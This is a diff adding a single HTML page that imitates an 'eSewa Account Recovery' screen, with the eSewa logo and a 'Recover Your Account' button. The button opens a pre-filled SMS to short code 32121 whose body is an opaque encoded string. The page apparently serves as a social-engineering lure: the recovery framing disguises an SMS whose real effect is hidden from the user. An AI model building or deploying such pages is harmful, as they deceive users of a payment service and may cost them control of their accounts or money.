@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>eSewa Account Recovery</title>
+  <style>
+    /* Internal CSS */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: #f4f6f8;
+      color: #333;
+    }
+
+    .container {
+      max-width: 600px;
+      margin: 80px auto;
+      padding: 30px;
+      background-color: #ffffff;
+      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+      border-radius: 12px;
+      text-align: center;
+    }
+
+    .logo {
+      width: 160px;
+      margin-bottom: 25px;
+    }
+
+    h1 {
+      font-size: 28px;
+      margin-bottom: 15px;
+      color: #2e7d32;
+    }
+
+    p {
+      font-size: 16px;
+      margin-bottom: 30px;
+    }
+
+    .recover-btn {
+      display: inline-block;
+      background-color: #4CAF50;
+      color: white;
+      padding: 14px 28px;
+      text-decoration: none;
+      font-size: 18px;
+      border-radius: 8px;
+      transition: background-color 0.3s ease, transform 0.2s ease;
+    }
+
+    .recover-btn:hover {
+      background-color: #388e3c;
+      transform: translateY(-2px);
+    }
+
+    @media (max-width: 600px) {
+      .container {
+        margin: 40px 20px;
+        padding: 20px;
+      }
+
+      h1 {
+        font-size: 24px;
+      }
+
+      .recover-btn {
+        width: 100%;
+        padding: 16px;
+        font-size: 16px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <header>
+      <img 
+        src="https://upload.wikimedia.org/wikipedia/en/thumb/4/45/ESewa_logo.png/220px-ESewa_logo.png" 
+        alt="eSewa Logo" 
+        class="logo" />
+    </header>
+
+    <main>
+      <h1>Recover Your eSewa Account</h1>
+      <p>you're having trouble accessing your account, use the button below to send a recovery message.</p>
+      <a href="sms:32121?body=E@E Iz41Pi9TKCQoIzISRyM=" class="recover-btn">Recover Your Account</a>
+    </main>
+  </div>
+</body>
+</html>
